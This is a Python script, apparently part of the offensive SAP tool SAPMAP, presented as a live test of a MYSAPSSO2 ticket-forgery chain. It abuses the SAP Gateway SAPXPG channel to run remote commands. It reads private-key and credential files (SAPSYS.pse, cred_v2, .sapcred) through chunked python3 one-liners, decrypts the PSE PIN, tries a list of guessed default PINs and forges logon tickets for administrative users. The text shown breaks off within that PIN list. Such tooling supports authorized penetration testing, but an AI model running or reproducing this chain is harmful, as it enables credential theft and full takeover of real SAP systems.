#!/usr/bin/env python3
"""Live end-to-end test: MYSAPSSO2 ticket forgery chain.

Exercises the full crypto pipeline against a real SAP system via
SAPMAP's existing GW SAPXPG channel:

    extract PSE  →  decrypt PIN  →  extract key  →  forge ticket  →  save artifacts

Usage (S4H example):
    python3 tools/test_mysapsso2_chain.py \\
        --host 192.168.2.209 --port 3300 \\
        --sid S4H --hostname s4hanadev --instance 00 \\
        --user "SAP*" --client 000

    python3 tools/test_mysapsso2_chain.py \\
        --host 192.168.2.209 --port 3301 \\
        --sid S4D --hostname s4hanadev --instance 01 \\
        --user DDIC --client 000

The script:
  1. Opens a GW SAPXPG connection and builds a gw_exec_fn adapter
  2. extract_pse_bundle()  — retrieves SAPSYS.pse + cred_v2 via base64 cat
  3. decrypt_cred_v2()     — recovers the PSE PIN from the cred_v2 blob
  4. extract_signing_key() — decrypts the PSE and extracts the private key + cert
  5. forge_ticket()        — builds + signs a MYSAPSSO2 logon ticket
  6. save_ticket_artifacts() — writes .sap / curl.sh / pyrfc.json / ticket.b64

All modules are the clean-room implementations from commits 1–6.
No Synacktiv code, no pysap dependency — stdlib + cryptography only.

For authorized security testing only (Cyber Verification Program).
"""

from __future__ import annotations

import argparse
import os
import socket
import sys
import textwrap
import time

# ---------------------------------------------------------------------------
# Path setup — locate SAPMAP modules relative to this script
# ---------------------------------------------------------------------------
_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_TOOLS_DIR)

# Module search paths (same order SAPMAP uses at runtime)
for _subdir in ("modules/exploitation", "modules/postex",
                "modules/core", "modules"):
    _p = os.path.join(_ROOT, _subdir)
    if _p not in sys.path:
        sys.path.insert(0, _p)

# Now we can import SAPMAP modules
from sap_gw_xpg_standalone import (
    ni_send, ni_recv, ni_drain,
    build_p1, build_p2, build_p3, build_p4,
    parse_response, extract_p4_output, hexdump,
)
from sap_pse_loot import extract_pse_bundle, decrypt_cred_v2, extract_signing_key
from sap_mysapsso2 import forge_ticket, parse_ticket, encode_for_cookie
from sap_ticket_delivery import save_ticket_artifacts


# ---------------------------------------------------------------------------
# GW exec-fn adapter — wraps the standalone GW SAPXPG module into the
# Callable[[str, str], dict] shape that sap_pse_loot expects.
# ---------------------------------------------------------------------------

class _GwSession:
    """Manages a persistent GW SAPXPG session for multiple commands.

    Each command reuses the same TCP connection + conversation, sending
    P3 (execute) + P4 (retrieve output) per call.  Falls back to a
    fresh connection per call if the session dies.

    This is the adapter bridge: call .exec_fn(program, args) and get
    back {success, output, error}.
    """

    def __init__(self, host: str, port: int, sid: str, hostname: str,
                 instance: str, kernel: str, client: str,
                 timeout: int = 20, verbose: bool = False):
        self.host = host
        self.port = port
        self.sid = sid
        self.hostname = hostname
        self.instance = instance
        self.kernel = kernel
        self.client = client
        self.timeout = timeout
        self.verbose = verbose

        self._sock = None
        self._conv_id = None
        self._gw_id = 0
        self._cmd_count = 0

    # ----- connection management -----

    def _connect(self) -> bool:
        """Open a fresh GW session: connect → P1 → P2."""
        self._close()
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.settimeout(self.timeout)
            self._sock.connect((self.host, self.port))
        except socket.error as e:
            print(f"  [-] GW connect failed: {e}")
            return False

        local_ip = self._sock.getsockname()[0]

        # P1: register
        p1 = build_p1(self.host, self.instance)
        ni_send(self._sock, p1)
        try:
            resp = ni_recv(self._sock, self.timeout)
        except socket.timeout:
            print("  [-] P1: no response (timeout)")
            self._close()
            return False
        ni_drain(self._sock, 0.5)
        info = parse_response(resp, "P1")
        if info["error"]:
            print(f"  [-] P1 rejected: {info['error_msg']}")
            self._close()
            return False

        # P2: init sapxpg
        p2 = build_p2(self.host, "T_75", local_ip=local_ip,
                       target_hostname=self.hostname)
        ni_send(self._sock, p2)
        try:
            resp = ni_recv(self._sock, self.timeout)
        except socket.timeout:
            print("  [-] P2: no response — gateway likely protected (reginfo)")
            self._close()
            return False
        info = parse_response(resp, "P2")
        if info["error"]:
            print(f"  [-] P2 rejected: {info['error_msg']}")
            self._close()
            return False

        self._conv_id = info.get("conv_id") or "0"
        self._gw_id = info.get("gw_id", 0) or 0
        return True

    def _close(self):
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
        self._conv_id = None
        self._gw_id = 0

    def _ensure_session(self) -> bool:
        """Make sure we have a live session; reconnect if needed."""
        if self._sock and self._conv_id:
            return True
        return self._connect()

    # ----- the exec_fn adapter -----

    def exec_fn(self, program: str, args: str) -> dict:
        """Execute a command via GW SAPXPG.

        Matches the GwExecFn = Callable[[str, str], dict] shape:
        returns {success: bool, output: list[str], error: str}.

        Follows the same P3→P4 pattern as execute_gw_command() in
        sapmap_exploit.py: read ONE P3 frame (no drain), then
        immediately send P4 and read the output.
        """
        result = {"success": False, "output": [], "error": ""}
        self._cmd_count += 1

        # We reconnect for every command because the GW SAPXPG
        # session is single-use: P3 + P4 consume the conversation.
        if not self._connect():
            result["error"] = "GW session setup failed"
            return result

        if self.verbose:
            tag = f"  [cmd {self._cmd_count}]"
            # Truncate displayed args for readability
            disp_args = args if len(args) < 120 else args[:117] + "..."
            print(f"{tag} {program} {disp_args}")

        # P3: execute command
        p3 = build_p3(
            self._conv_id, self.host, self.hostname,
            self.sid, self.instance, self.kernel, "T_75",
            self.client, program, args, gw_id=self._gw_id)
        ni_send(self._sock, p3)

        try:
            resp_p3 = ni_recv(self._sock, self.timeout)
        except (socket.timeout, ConnectionError) as e:
            result["error"] = f"P3 timeout: {e}"
            self._close()
            return result

        if self.verbose:
            print(f"        P3 response: {len(resp_p3)} bytes")

        info = parse_response(resp_p3, "P3")
        if info["error"]:
            result["error"] = f"P3 error: {info['error_msg']}"
            self._close()
            return result

        # P4: retrieve output — mirrors execute_gw_command() exactly:
        # send P4 immediately after P3 (no drain), read one frame,
        # extract output lines.
        try:
            p4 = build_p4(
                self._conv_id, self.host, self.hostname,
                self.sid, self.instance, self.kernel, "T_75",
                self.client, gw_id=self._gw_id)
            ni_send(self._sock, p4)
            resp_p4 = ni_recv(self._sock, max(self.timeout, 15))

            if self.verbose:
                print(f"        P4 response: {len(resp_p4)} bytes")

            # CRITICAL: detect *ERR* in P4 BEFORE extracting output.
            # When sapxpg can't run a command (e.g. binary not in
            # PATH), the P4 frame contains "*ERR* connection to
            # partner 'localhost:0' broken" in its metadata area.
            # extract_p4_output() may still pick up TLV fragments
            # containing the hostname/SID strings (which happen to
            # be base64-alphabet compatible) as "output lines",
            # tricking the caller into thinking the command worked.
            if b"*ERR*" in resp_p4:
                # Surface the error like parse_response would
                p4_info = parse_response(resp_p4, "P4")
                err_msg = p4_info.get("error_msg",
                                       "command failed (*ERR* in P4)")
                # Strip the leading conv_id + codepage prefix for
                # readability
                err_short = err_msg
                for prefix in (f"{self._conv_id} | ", "1100 | "):
                    if err_short.startswith(prefix):
                        err_short = err_short[len(prefix):]
                result["success"] = False
                result["output"] = []
                result["error"] = f"sapxpg failed: {err_short[:200]}"
                if self.verbose:
                    print(f"        *ERR* in P4 → command failed")
                self._close()
                return result

            output_lines = extract_p4_output(resp_p4)

            # If P4 returned no lines, check if there were more
            # frames (some kernels split large output across frames)
            if not output_lines:
                extra = ni_drain(self._sock, 2)
                for frame in extra:
                    if b"*ERR*" in frame:
                        continue  # skip error frames
                    output_lines.extend(extract_p4_output(frame))
                    if self.verbose:
                        print(f"        extra frame: {len(frame)} bytes "
                              f"→ {len(output_lines)} lines total")

            result["success"] = True
            result["output"] = output_lines

            if self.verbose:
                print(f"        extracted {len(output_lines)} output line(s)")

        except (socket.timeout, ConnectionError) as e:
            # Command ran but output retrieval failed — still a success
            result["success"] = True
            result["output"] = ["(output retrieval timed out)"]
            print(f"  [diag] P4 recv exception: {e}")
            print(f"  [diag] P3 was {len(resp_p3)}B, "
                  f"conv_id={self._conv_id}")
        except Exception as e:
            result["error"] = f"P4 error: {e}"

        self._close()
        return result


# ---------------------------------------------------------------------------
# Robust exec_fn wrapper — handles base64 unavailability
# ---------------------------------------------------------------------------
#
# sapxpg on kernel 793 can't find `base64` in its restricted PATH — the
# P4 response returns "*ERR* connection to partner 'localhost:0' broken".
#
# Strategy: fall back to `xxd -p` (hex dump) which IS available on every
# Linux with vim-minimal (standard on SUSE for SAP).  The adapter
# intercepts `base64 <path>` calls, runs `xxd -p <path>` instead,
# hex-decodes the output locally, re-encodes as base64, and returns
# the base64 lines to the caller as if `base64` had produced them.
#
# This is transparent to sap_pse_loot._read_file_b64() — it sees normal
# base64 output and decodes it as usual.

import base64 as _b64_mod
import re as _re_mod

# Base64 alphabet (strict check — reject TLV metadata / protocol junk
# that extract_p4_output might pick up as "output lines")
_B64_CHARS = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
                 "0123456789+/=\n\r \t")
_HEX_RE = _re_mod.compile(r'^[0-9a-fA-F\s]+$')


def _looks_like_b64(lines: list) -> bool:
    """True if output lines look like valid base64 (not TLV garbage)."""
    if not lines:
        return False
    text = "".join(lines)
    if not text.strip():
        return False
    # Every character must be in the base64 alphabet + whitespace
    return all(c in _B64_CHARS for c in text)


def _looks_like_hex(lines: list) -> bool:
    """True if output lines look like hex dump from `xxd -p`."""
    if not lines:
        return False
    text = "".join(lines).strip()
    return bool(text) and bool(_HEX_RE.match(text))


def _hex_to_b64_lines(hex_lines: list) -> list:
    """Convert hex-dump output (from xxd -p) to base64 lines.

    xxd -p output: continuous hex like "4d5a9000 03000000..."
    We hex-decode to bytes, then base64-encode and split into 76-char
    lines (mimicking coreutils base64 output format).
    """
    hex_str = "".join(ln.strip() for ln in hex_lines)
    raw = bytes.fromhex(hex_str)
    b64 = _b64_mod.b64encode(raw).decode("ascii")
    # Split into 76-char lines like coreutils base64
    return [b64[i:i+76] for i in range(0, len(b64), 76)]


def _has_b64_output(r: dict) -> bool:
    """True if the result has non-empty, valid base64 output."""
    if not r.get("success"):
        return False
    lines = r.get("output", [])
    return _looks_like_b64(lines)


def _has_hex_output(r: dict) -> bool:
    """True if the result has non-empty, valid hex output."""
    if not r.get("success"):
        return False
    lines = r.get("output", [])
    return _looks_like_hex(lines)


def _has_any_output(r: dict) -> bool:
    """True if the result has any non-empty, non-error output."""
    if not r.get("success"):
        return False
    out = "\n".join(r.get("output", []))
    if not out.strip():
        return False
    lower = out.lower()
    for marker in ("no such file", "permission denied", "not found",
                   "*err*", "connection to partner", "a password is"):
        if marker in lower:
            return False
    return True


# Fallback strategies in priority order:
#   - "b64" strategies return base64 output (pass through directly)
#   - "hex" strategies return hex output (adapter converts to base64)
#
# Note: sapxpg splits PARAMS on whitespace.  Python/perl one-liners
# MUST have no internal spaces in the code argument — otherwise sapxpg
# breaks them into multiple args and the interpreter sees garbage.
# This is the same constraint chunked_drop_and_run handles in
# sap_dpmon_sapstar.py.  We use `print(__import__('base64')...)`
# instead of `import base64;print(base64...)` to avoid the `;`-space
# pattern and inline the import.
_FALLBACK_STRATEGIES = [
    # (label, encoding, program, args_template)
    # python3 first — proven to work via chunked_drop_and_run on these
    # exact S4H systems (uses /usr/bin/python3 implicitly via PATH).
    ("python3-b64", "b64", "python3",
     "-c print(__import__('base64').b64encode(open('{path}','rb').read()).decode())"),
    # /usr/bin/openssl with -A is also proven via chunked_drop_and_run.
    ("openssl-b64", "b64", "/usr/bin/openssl",
     "enc -A -base64 -in {path}"),
    # Bare base64 / xxd / od — long shots that usually fail on patched
    # kernels but worth trying if the above don't work.
    ("base64-fp", "b64", "/usr/bin/base64", "{path}"),
    ("xxd-hex",   "hex", "/usr/bin/xxd",    "-p {path}"),
    ("od-hex",    "hex", "/usr/bin/od",     "-A n -t x1 {path}"),
]

_SUDO_FALLBACK_STRATEGIES = [
    ("sudo-python3", "b64", "sudo",
     "python3 -c print(__import__('base64').b64encode(open('{path}','rb').read()).decode())"),
    ("sudo-openssl", "b64", "sudo",
     "/usr/bin/openssl enc -A -base64 -in {path}"),
    ("sudo-base64",  "b64", "sudo", "/usr/bin/base64 {path}"),
]


def make_robust_exec_fn(session: "_GwSession", verbose: bool = False):
    """Wrap session.exec_fn with chunked python3-based file reading.

    On sapxpg kernel 793, the standard `base64 <path>` mechanism is
    unreliable: the binary fails to execute, or the output is dropped
    entirely when it exceeds sapxpg's output buffer (~400-600 bytes).

    Strategy: for ANY base64 / sudo-base64 request, use python3 to
    read the file in 300-byte chunks via slicing.  This is the same
    pattern chunked_drop_and_run uses in sap_dpmon_sapstar.py, proven
    to work on these S4H/S4D systems.
    """
    # Chunk size — sapxpg on kernel 793 truncates command stdout to
    # ~128 bytes (the TLV block size used by the new-kernel output
    # format).  We must keep base64 output under this limit:
    #   72 raw bytes → 96 chars base64 + newline → 97 chars (safe)
    # This means many more round-trips for big files (3.6KB PSE
    # needs ~50 chunks), but it's the only reliable approach.
    CHUNK_RAW = 72

    def _dedupe(lines):
        """Collapse consecutive duplicate lines (TLV double-scan artifact)."""
        out = []
        for ln in lines:
            if not out or out[-1] != ln:
                out.append(ln)
        return out

    def _get_file_size(file_path: str) -> int:
        """Get the size of a file on the target via python3."""
        r = session.exec_fn(
            "python3",
            f"-c print(__import__('os').path.getsize('{file_path}'))")
        if not r.get("success"):
            # Always print (not just verbose) — this failure mode is
            # critical to diagnose
            print(f"  [chunked] size query failed for {file_path}: "
                  f"{r.get('error', '?')[:200]}")
            # Show actual output too — might contain a Python traceback
            out = "\n".join(r.get("output", []))
            if out.strip():
                print(f"  [chunked] size query output: {out[:200]!r}")
            return -1
        lines = _dedupe(r.get("output", []))
        for ln in lines:
            ln = ln.strip()
            if ln.isdigit():
                return int(ln)
        # No digit found — print what we DID get
        print(f"  [chunked] size query returned non-numeric "
              f"for {file_path}")
        print(f"  [chunked] got output ({len(lines)} lines): "
              f"{lines[:3]}")
        return -1

    def _read_chunked(file_path: str, use_sudo: bool = False) -> dict:
        """Read a file in CHUNK_RAW-byte chunks via python3 slicing.

        Returns the standard exec_fn dict with one base64 line that
        encodes the FULL file content (re-encoded locally after
        decode-and-concatenate).
        """
        # Always print invocation so we can see this path is taken
        print(f"  [chunked] reading {file_path} "
              f"(sudo={use_sudo}) ...")

        size = _get_file_size(file_path)
        if size < 0:
            print(f"  [chunked] FAILED: could not get size")
            return {"success": False, "output": [],
                    "error": f"could not determine size of {file_path}"}

        if size == 0:
            print(f"  [chunked] {file_path}: 0 bytes (empty file)")
            return {"success": True, "output": [""], "error": ""}

        n_chunks = (size + CHUNK_RAW - 1) // CHUNK_RAW
        print(f"  [chunked] {file_path}: {size} bytes, "
              f"{n_chunks} chunk(s) of {CHUNK_RAW} bytes")

        # Python3 program: prints base64 of file[O:E].  No spaces in code.
        all_bytes = bytearray()
        for offset in range(0, size, CHUNK_RAW):
            end = min(offset + CHUNK_RAW, size)
            code = (f"print(__import__('base64').b64encode("
                    f"open('{file_path}','rb').read()[{offset}:{end}])"
                    f".decode())")
            program = "sudo" if use_sudo else "python3"
            params = f"python3 -c {code}" if use_sudo else f"-c {code}"

            r = session.exec_fn(program, params)
            if not r.get("success"):
                print(f"  [chunked] chunk {offset}-{end} failed: "
                      f"{r.get('error', '?')[:200]}")
                return {"success": False, "output": [],
                        "error": (f"chunk {offset}-{end} failed: "
                                  f"{r.get('error', '?')[:100]}")}

            lines = _dedupe(r.get("output", []))
            b64_chunk = "".join(ln.strip() for ln in lines)
            if not b64_chunk:
                print(f"  [chunked] chunk {offset}-{end} empty output")
                return {"success": False, "output": [],
                        "error": (f"chunk {offset}-{end} returned "
                                  f"empty output")}
            try:
                raw = _b64_mod.b64decode(b64_chunk, validate=True)
            except Exception as e:
                print(f"  [chunked] chunk {offset}-{end} decode failed: "
                      f"{e} text={b64_chunk[:60]!r}")
                return {"success": False, "output": [],
                        "error": (f"chunk {offset}-{end} b64decode "
                                  f"failed: {e}")}
            all_bytes.extend(raw)
            # Show progress every 10 chunks (avoid spam for big files)
            chunk_idx = offset // CHUNK_RAW
            if chunk_idx % 10 == 0 or end == size:
                pct = 100 * len(all_bytes) // size
                print(f"  [chunked]   chunk {chunk_idx+1}/{n_chunks} "
                      f"({offset}-{end}): got {len(raw)}B "
                      f"(total {len(all_bytes)}/{size}B = {pct}%)")

        if len(all_bytes) != size:
            print(f"  [chunked] size mismatch: "
                  f"got {len(all_bytes)}B expected {size}B")
            return {"success": False, "output": [],
                    "error": (f"size mismatch: got {len(all_bytes)} "
                              f"bytes, expected {size}")}

        print(f"  [chunked] SUCCESS: {len(all_bytes)} bytes from "
              f"{file_path}")
        # Return as a single base64 line (caller expects base64 format)
        full_b64 = _b64_mod.b64encode(bytes(all_bytes)).decode("ascii")
        return {"success": True, "output": [full_b64], "error": ""}

    def robust_exec_fn(program: str, args: str) -> dict:
        is_base64 = program in ("base64", "/usr/bin/base64")
        is_sudo_base64 = (program == "sudo"
                          and "base64" in args.split()[0:2])

        # Non-base64 commands: pass through directly
        if not is_base64 and not is_sudo_base64:
            return session.exec_fn(program, args)

        # sap_pse_loot._read_file_b64() retries with sudo when the
        # first attempt fails.  But on these SAP systems sudo isn't
        # NOPASSWD-configured for s4hadm, so sudo always fails with
        # "sudo: a terminal is required to read the password".
        # Short-circuit sudo retries — they'll never work.
        if is_sudo_base64:
            return {"success": False, "output": [],
                    "error": ("sudo not NOPASSWD on this system; "
                              "first attempt should have worked")}

        file_path = args.strip()

        # ALWAYS chunk — single, robust code path.  Small files are
        # one chunk; large files use as many as needed.
        return _read_chunked(file_path, use_sudo=False)

    return robust_exec_fn


# ---------------------------------------------------------------------------
# Pretty-print helpers
# ---------------------------------------------------------------------------

_SECTION_WIDTH = 68

def _banner(title: str):
    print(f"\n{'=' * _SECTION_WIDTH}")
    print(f"  {title}")
    print(f"{'=' * _SECTION_WIDTH}")

def _step(n: int, title: str):
    print(f"\n{'─' * _SECTION_WIDTH}")
    print(f"  Step {n}: {title}")
    print(f"{'─' * _SECTION_WIDTH}")

def _ok(msg: str):
    print(f"  [+] {msg}")

def _info(msg: str):
    print(f"  [*] {msg}")

def _fail(msg: str):
    print(f"  [-] {msg}")

def _detail(label: str, value, indent: int = 6):
    pad = " " * indent
    print(f"{pad}{label:20s}: {value}")


# ---------------------------------------------------------------------------
# Credential file discovery
# ---------------------------------------------------------------------------

def _discover_pin_sources(session, args) -> bool:
    """Scan target for credential files that might hold a PSE PIN.

    Looks in well-known locations for files of interest:
      - cred_v2 in every SECUDIR variant (instance + global)
      - sec_secstore.dat (modern SAP PIN store)
      - .sapcred (user-specific SAP credential)
      - PSE working files, dev_w/dev_disp traces (may leak PINs in
        debug builds, very rare)
    """
    sid = args.sid.upper()
    # Probe a list of files / directories
    paths_to_check = [
        # Instance per-instance SECUDIR (we already know this works)
        f"/usr/sap/{sid}/D{args.instance}/sec",
        # Global / HA SECUDIR
        f"/usr/sap/{sid}/SYS/global/security/data",
        # Generic per-instance paths (other instance types)
        f"/usr/sap/{sid}/DVEBMGS{args.instance}/sec",
        f"/usr/sap/{sid}/ASCS{args.instance}/sec",
        f"/usr/sap/{sid}/SCS{args.instance}/sec",
        # Per-sidadm home directory credential file
        f"/home/{sid.lower()}adm/.sapcred",
        f"/sapmnt/{sid}/global/security/data",
    ]

    # Step 1: ls each directory candidate to see what's there
    _info("Probing directories for credential files ...")
    for path in paths_to_check:
        r = session.exec_fn("ls", f"-la {path}")
        out = "\n".join(r.get("output", []))
        if (r.get("success") and out.strip()
                and "No such file" not in out
                and "*ERR*" not in out):
            print(f"\n  --- {path} ---")
            for line in out.split("\n"):
                line = line.strip()
                # Skip dupes from extract_p4_output
                if not line:
                    continue
                # Show entries that look like credentials/PSEs/datafiles
                lower = line.lower()
                if any(m in lower for m in (
                        "cred", "secstore", ".pse", "ticket",
                        ".dat", ".sap", "rwx", "rw-")):
                    print(f"    {line}")
        else:
            # Show as quick "not present" so user knows we checked
            err = (r.get("error", "")
                   or out.strip().split("\n")[0][:60])
            print(f"  - {path}: not accessible ({err[:60]})")

    # Step 2: find all cred_v2 and sec_secstore.dat files across /usr/sap/<SID>
    _info("\nFinding any 'cred*' or 'sec_secstore*' under "
          f"/usr/sap/{sid} ...")
    r = session.exec_fn("find",
                        f"/usr/sap/{sid} -type f "
                        f"-name cred* -o -name sec_secstore* "
                        f"-o -name .sapcred*")
    out = "\n".join(r.get("output", [])).strip()
    if out and "*ERR*" not in out:
        print(f"\n  Files found:")
        # Dedupe consecutive lines (TLV artifact)
        seen = set()
        for line in out.split("\n"):
            line = line.strip()
            if line and line not in seen and line.startswith("/"):
                seen.add(line)
                print(f"    {line}")
    else:
        print(f"  No additional credential files found "
              f"(or find unavailable)")

    # Step 3: tell user how to read any interesting findings
    print()
    _info("Next: if any of the above files are NEW, read them with:")
    _info("  python3 tools/test_mysapsso2_chain.py \\")
    _info(f"      --host {args.host} --port {args.port} \\")
    _info(f"      --sid {args.sid} --hostname {args.hostname} \\")
    _info("      --pse-path <full-path-to-file>")
    print()
    _info("For cred_v2 / sec_secstore.dat files: extract them via")
    _info("the chunked channel, then run sap_pse_loot.decrypt_cred_v2")
    _info("manually on the bytes to recover any PINs.")
    return True


# ---------------------------------------------------------------------------
# Main chain
# ---------------------------------------------------------------------------

def run_chain(args):
    """Execute the full MYSAPSSO2 forgery chain."""

    _banner(f"MYSAPSSO2 Ticket Forgery — {args.sid}")
    _info(f"Target    : {args.host}:{args.port}")
    _info(f"SID       : {args.sid}")
    _info(f"Hostname  : {args.hostname}")
    _info(f"Instance  : {args.instance}")
    _info(f"User      : {args.user}")
    _info(f"Client    : {args.client}")
    _info(f"Kernel    : {args.kernel}")
    _info(f"Timestamp : {time.strftime('%Y-%m-%d %H:%M:%S')}")

    # Build the GW SAPXPG adapter
    session = _GwSession(
        host=args.host, port=args.port,
        sid=args.sid, hostname=args.hostname,
        instance=args.instance, kernel=args.kernel,
        client=args.client, timeout=args.timeout,
        verbose=args.verbose)

    # Wrap with automatic base64 fallback (sapxpg on kernel 793 often
    # can't find `base64` in its restricted PATH — we fall back to
    # /usr/bin/base64, openssl base64, or python3).
    exec_fn = make_robust_exec_fn(session, verbose=args.verbose)

    # ── Discovery mode: scan for credential files ─────────────────
    if args.find_pins:
        _banner(f"Credential File Discovery — {args.sid}")
        return _discover_pin_sources(session, args)

    # ── Pre-flight: discover which tools are available via sapxpg ───
    _info("Pre-flight: probing available tools on target ...")
    tools_to_probe = [
        ("which base64",  "which",  "base64"),
        ("which xxd",     "which",  "xxd"),
        ("which od",      "which",  "od"),
        ("which openssl", "which",  "openssl"),
        ("which python3", "which",  "python3"),
        ("which perl",    "which",  "perl"),
    ]
    available = {}
    for label, prog, arg in tools_to_probe:
        r = session.exec_fn(prog, arg)
        out = "\n".join(r.get("output", [])).strip()
        # `which` outputs the path if found, nothing if not found
        # If output starts with '/' it's a valid path; otherwise unavailable
        if r.get("success") and out and out.startswith("/"):
            available[arg] = out.split()[0]
            _ok(f"{label:20s} → {available[arg]}")
        else:
            print(f"      [-] {label:20s} → not available "
                  f"(success={r.get('success')}, out={out[:40]!r})")

    if not available:
        _fail("No encoding tools available via sapxpg — aborting")
        _fail("The GW SAPXPG channel cannot find any of: "
              "base64, xxd, od, openssl, python3, perl")
        return False

    _info(f"Found {len(available)} tool(s): {list(available.keys())}")

    # ── Pre-flight: gold-standard encoding test ─────────────────────
    # Compare base64-decode-back against cat's raw text output.
    # NOTE: extract_p4_output() duplicates output when sapxpg returns
    # the same data in both old (\x03\x04\x03\x04) and new
    # (\x03\x02\x03\x03) TLV formats — so cat output is often 2x.
    # We dedupe before comparing.
    _info("Testing binary-to-text encoding (gold-standard check) ...")
    import base64 as _b64

    def _dedupe_consecutive(text: str) -> str:
        """Collapse consecutive duplicate lines (artifact of TLV
        double-scanning in extract_p4_output)."""
        lines = text.split("\n")
        out = []
        for ln in lines:
            if not out or out[-1] != ln:
                out.append(ln)
        return "\n".join(out)

    # Step A: get ground truth via cat (which we know works)
    r_cat = session.exec_fn("cat", "/etc/hostname")
    cat_raw = "\n".join(r_cat.get("output", [])).strip()
    if not cat_raw:
        _fail("cat /etc/hostname returned nothing — channel broken")
        return False
    cat_dedup = _dedupe_consecutive(cat_raw)
    _info(f"Ground truth (cat, deduped): {cat_dedup!r}")

    # Step B: get base64-encoded version via wrapper (uses fallback)
    r_b64 = exec_fn("base64", "/etc/hostname")
    b64_text = "".join(r_b64.get("output", [])).strip()
    if not b64_text:
        _fail("base64 returned no output at all")
        _fail("None of the fallback strategies could run an encoder.")
        return False

    # Step C: decode and compare
    try:
        decoded = _b64.b64decode(b64_text, validate=True)
        decoded_text = decoded.decode(errors="replace").strip()
        # Dedupe the decoded text too (it might also be duplicated if
        # the encoder ran through extract_p4_output)
        decoded_dedup = _dedupe_consecutive(decoded_text)
    except Exception as e:
        _fail(f"base64 output is not valid base64: {e}")
        _fail(f"Output preview: {b64_text[:80]!r}")
        return False

    # Accept if either form matches (b64 may or may not be duplicated)
    if (decoded_text == cat_dedup or decoded_dedup == cat_dedup
            or decoded_text == cat_raw):
        _ok(f"Encoding verified: b64 → {decoded_dedup!r}")
        # Tell the user which strategy won
        _info(f"Strategy in use: python3 / openssl / base64 fallback")
    else:
        _fail("Encoding test FAILED — fallback returned wrong content")
        _fail(f"  cat (raw)    : {cat_raw!r}")
        _fail(f"  cat (deduped): {cat_dedup!r}")
        _fail(f"  b64 (decoded): {decoded_text!r}")
        _fail(f"  b64 (deduped): {decoded_dedup!r}")
        _fail("")
        _fail("Try running the standalone GW SAPXPG tool directly:")
        _fail(f"  python3 modules/exploitation/sap_gw_xpg_standalone.py \\")
        _fail(f"      --host {args.host} --port {args.port} \\")
        _fail(f"      --sid {args.sid} --hostname {args.hostname} \\")
        _fail(f"      --command python3 --params \\")
        _fail(f"      \"-c print(__import__('base64').b64encode("
              f"open('/etc/hostname','rb').read()).decode())\"")
        return False

    # ── Step 1: Extract PSE bundle ─────────────────────────────────
    pse_label = (os.path.basename(args.pse_path) if args.pse_path
                  else "SAPSYS.pse")
    _step(1, f"Extract PSE bundle ({pse_label} + cred_v2)")

    bundle = extract_pse_bundle(
        gw_exec_fn=exec_fn,
        sid=args.sid,
        instance_dir=args.instance_dir,
        save_loot=True,
        label=args.sid)

    if not bundle["success"]:
        _fail(f"PSE extraction failed: {bundle['error']}")
        return False

    # If user wants a different PSE than SAPSYS.pse, fetch it now
    # and replace bundle["pse_bytes"]
    if args.pse_path:
        _info(f"Override: reading alternate PSE {args.pse_path}")
        from sap_pse_loot import _read_file_b64
        r = _read_file_b64(exec_fn, args.pse_path)
        if not r["success"]:
            _fail(f"Could not read {args.pse_path}: {r['error']}")
            return False
        bundle["pse_bytes"] = r["bytes"]
        _info(f"Alternate PSE loaded: {len(r['bytes'])} bytes")
        # Also save this PSE next to the standard one in loot
        if bundle.get("loot_path"):
            alt_dst = os.path.join(bundle["loot_path"], pse_label)
            try:
                with open(alt_dst, "wb") as fh:
                    fh.write(r["bytes"])
                _info(f"Saved alternate PSE to {alt_dst}")
            except OSError as e:
                _info(f"Could not save alternate PSE: {e}")

    _ok("PSE bundle extracted")
    _detail("sidadm user", bundle["sidadm_user"])
    _detail("SECUDIR", bundle["secudir"])
    _detail("PSE size", f"{len(bundle['pse_bytes'] or b'')} bytes")
    _detail("cred_v2 size", f"{len(bundle['cred_v2_bytes'] or b'')} bytes")
    if bundle["loot_path"]:
        _detail("loot saved to", bundle["loot_path"])
    if bundle["other_files"]:
        _detail("other SECUDIR files", ", ".join(bundle["other_files"]))

    if not bundle["pse_bytes"]:
        _fail("No PSE bytes — cannot continue")
        return False
    if not bundle["cred_v2_bytes"]:
        _fail("No cred_v2 bytes — cannot decrypt PSE PIN")
        return False

    # ── Step 2: Decrypt cred_v2 → recover PIN ─────────────────────
    _step(2, "Decrypt cred_v2 → recover PSE PIN")

    cred_result = decrypt_cred_v2(
        cred_v2_bytes=bundle["cred_v2_bytes"],
        sidadm_user=bundle["sidadm_user"])

    if not cred_result["success"]:
        _fail(f"cred_v2 decryption failed: {cred_result['error']}")
        if cred_result.get("credentials"):
            _info("Credential records found:")
            for c in cred_result["credentials"]:
                _detail("format", c.get("format", "?"), indent=8)
                _detail("pse_path", c.get("pse_path", "?"), indent=8)
        return False

    pin = cred_result["pin"]
    _ok(f"PIN recovered: {pin[:4]}{'*' * max(0, len(pin) - 4)}")
    _detail("PIN length", f"{len(pin)} chars")
    _detail("PSE path (cred)", cred_result["pse_path"])
    if cred_result.get("credentials"):
        _detail("total records", len(cred_result["credentials"]))
        for i, c in enumerate(cred_result["credentials"]):
            _info(f"  record {i}: format={c.get('format', '?')}, "
                  f"pse={c.get('pse_path', '?')}")

    # ── Step 3: Extract signing key ───────────────────────────────
    _step(3, "Decrypt PSE → extract signing key + certificate")

    # The cred_v2 on this S4H system references SAPSNCS.pse, not
    # SAPSYS.pse — so the PIN we recovered may not be the one for
    # the PSE we're trying to decrypt.  Try several PIN candidates.
    if args.pin_override is not None:
        # User explicitly specified the PIN
        pin_candidates = [(args.pin_override,
                           f"override from --pin-override")]
    else:
        sid_lc = args.sid.lower()
        sid_uc = args.sid.upper()
        pin_candidates = [
            (pin, f"from cred_v2 ({cred_result.get('pse_path', '?')})"),
            ("", "empty PIN (PSE with no password)"),
            # SID-derived guesses (very common SAP install defaults)
            (sid_uc, f"SID upper-case ({sid_uc!r})"),
            (sid_lc, f"SID lower-case ({sid_lc!r})"),
            (f"{sid_uc}123", f"SID + 123"),
            (f"{sid_lc}123", f"sid + 123"),
            ("sap123", "common SAP default"),
            ("changeme", "common default"),
            ("abv+056d#3oU", "legacy SAPSYS default"),
            # Numeric defaults
            ("12345", "numeric default"),
            ("000000", "zero pin"),
            # SAPADM-related
            (f"{sid_lc}adm", f"<sid>adm name"),
        ]
